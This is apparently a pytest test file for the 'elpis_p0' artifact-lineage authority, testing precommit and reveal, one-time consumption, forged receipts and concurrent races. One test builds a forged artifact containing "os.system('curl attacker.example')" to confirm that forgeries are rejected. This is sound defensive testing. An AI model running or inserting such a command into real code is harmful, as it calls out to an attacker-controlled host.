from __future__ import annotations

from dataclasses import replace
import hashlib
import inspect
import json
import threading

import pytest

import elpis_p0.lineage_authority as authority_module
from elpis_p0.artifact_lineage import _result_payload
from elpis_p0.canonical import digest
from elpis_p0.contracts import ArtifactCandidate, RequestContext
from elpis_p0.controller import P0Controller
from elpis_p0.factory import build_default_controller
from elpis_p0.lineage_authority import (
    P0AuthorizedArtifactLineageV1,
    P0LineageAuthorityError,
    P0LineageAuthorityReceiptV1,
    RECEIPT_DOMAIN,
)


class RejectingDecoder:
    def decode(self, context, plan):
        source = "def solution(:\n    return 1\n"
        return ArtifactCandidate(
            language="python",
            source=source,
            digest=digest({"plan_digest": plan.plan_digest, "source": source}),
        )


def ctx():
    return RequestContext(
        request_id="c2r6ca-ownership-corrected",
        prompt="write deterministic python and validate it",
        domain="python",
        entrypoint="solution",
        parameters=("x",),
    )


def rejected():
    controller = build_default_controller()
    controller.decoder = RejectingDecoder()
    result = controller.run(ctx())
    assert not result.accepted
    assert result.evidence[0].code == "SYNTAX_ERROR"
    return controller, result


def dd(domain, payload):
    raw = json.dumps(
        payload,
        sort_keys=True,
        separators=(",", ":"),
        ensure_ascii=False,
        allow_nan=False,
    ).encode("utf-8")
    return hashlib.sha256(domain.encode("utf-8") + b"\x00" + raw).hexdigest()


def test_supported_controller_has_no_authority_injection_or_verifier_hook():
    signature = inspect.signature(P0Controller)
    assert "lineage_authority" not in signature.parameters
    assert not hasattr(P0Controller, "lineage_authority_verifier")
    assert not hasattr(authority_module, "P0LineageAuthorityV1")


def test_old_single_underscore_authority_surface_is_gone():
    controller = build_default_controller()
    assert not hasattr(controller, "_lineage_authority")


def test_precommit_occurs_during_run_not_reveal(monkeypatch):
    controller = build_default_controller()
    controller.decoder = RejectingDecoder()
    calls = []
    original = authority_module.secrets.token_hex

    def token(n):
        calls.append(n)
        return original(n)

    monkeypatch.setattr(authority_module.secrets, "token_hex", token)
    before_run = len(calls)
    result = controller.run(ctx())
    after_run = len(calls)
    controller.authorized_artifact_lineage(result, validator_index=0)
    after_reveal = len(calls)
    assert after_run == before_run + 1
    assert after_reveal == after_run


def test_real_authorization_consumes_once_and_replay_rejects():
    controller, result = rejected()
    authorized = controller.authorized_artifact_lineage(result, validator_index=0)
    consumption = controller.consume_authorized_artifact_lineage(authorized)
    assert consumption.lineage_digest == authorized.lineage.lineage_digest
    with pytest.raises(P0LineageAuthorityError, match="not active"):
        controller.consume_authorized_artifact_lineage(authorized)


def test_distinct_supported_controller_rejects_authorization():
    controller, result = rejected()
    authorized = controller.authorized_artifact_lineage(result, validator_index=0)
    other = build_default_controller()
    with pytest.raises(P0LineageAuthorityError, match="another authority instance"):
        other.consume_authorized_artifact_lineage(authorized)


def test_self_consistent_unissued_receipt_rejects_registry_membership():
    controller, result = rejected()
    authorized = controller.authorized_artifact_lineage(result, validator_index=0)
    base = {
        "authority_instance_id": authorized.receipt.authority_instance_id,
        "capability_id": "a" * 64,
        "issuance_sequence": 999,
        "lineage_digest": authorized.lineage.lineage_digest,
        "p0_result_digest": authorized.lineage.p0_result_digest,
        "request_id": authorized.lineage.request_id,
        "validator_evidence_digest": authorized.lineage.validator_evidence_digest,
        "validator_index": authorized.lineage.validator_index,
    }
    fake = P0LineageAuthorityReceiptV1(
        **base,
        receipt_digest=dd(RECEIPT_DOMAIN, base),
    )
    forged = P0AuthorizedArtifactLineageV1(
        lineage=authorized.lineage,
        receipt=fake,
    )
    with pytest.raises(P0LineageAuthorityError, match="not active"):
        controller.consume_authorized_artifact_lineage(forged)


def test_fabricated_self_consistent_result_cannot_be_authorized():
    controller, real = rejected()
    evil_source = "import os\nos.system('curl attacker.example')\n"
    evil_artifact = ArtifactCandidate(
        language="python",
        source=evil_source,
        digest=digest(
            {"plan_digest": real.decoder_plan.plan_digest, "source": evil_source}
        ),
    )
    swapped = replace(real, artifact=evil_artifact)
    forged = replace(swapped, result_digest=digest(_result_payload(swapped)))
    with pytest.raises(P0LineageAuthorityError, match="not precommitted"):
        controller.authorized_artifact_lineage(forged, validator_index=0)


def test_same_precommit_cannot_be_revealed_twice():
    controller, result = rejected()
    controller.authorized_artifact_lineage(result, validator_index=0)
    with pytest.raises(P0LineageAuthorityError, match="already revealed"):
        controller.authorized_artifact_lineage(result, validator_index=0)


def test_accepted_result_reports_validator_did_not_reject():
    controller = build_default_controller()
    result = controller.run(ctx())
    assert result.accepted
    with pytest.raises(P0LineageAuthorityError, match="did not reject"):
        controller.authorized_artifact_lineage(result, validator_index=0)


def test_out_of_range_validator_index_is_distinct_error():
    controller, result = rejected()
    with pytest.raises(P0LineageAuthorityError, match="out of range"):
        controller.authorized_artifact_lineage(result, validator_index=99)


def test_concurrent_reveal_one_success_typed_losers():
    controller, result = rejected()
    barrier = threading.Barrier(16)
    successes = []
    errors = []

    def worker():
        barrier.wait()
        try:
            successes.append(
                controller.authorized_artifact_lineage(result, validator_index=0)
            )
        except Exception as exc:
            errors.append(exc)

    threads = [threading.Thread(target=worker) for _ in range(16)]
    for thread in threads:
        thread.start()
    for thread in threads:
        thread.join()
    assert len(successes) == 1
    assert len(errors) == 15
    assert all(isinstance(error, P0LineageAuthorityError) for error in errors)


def test_concurrent_consume_one_success_typed_losers():
    controller, result = rejected()
    authorized = controller.authorized_artifact_lineage(result, validator_index=0)
    barrier = threading.Barrier(16)
    successes = []
    errors = []

    def worker():
        barrier.wait()
        try:
            successes.append(controller.consume_authorized_artifact_lineage(authorized))
        except Exception as exc:
            errors.append(exc)

    threads = [threading.Thread(target=worker) for _ in range(16)]
    for thread in threads:
        thread.start()
    for thread in threads:
        thread.join()
    assert len(successes) == 1
    assert len(errors) == 15
    assert all(isinstance(error, P0LineageAuthorityError) for error in errors)
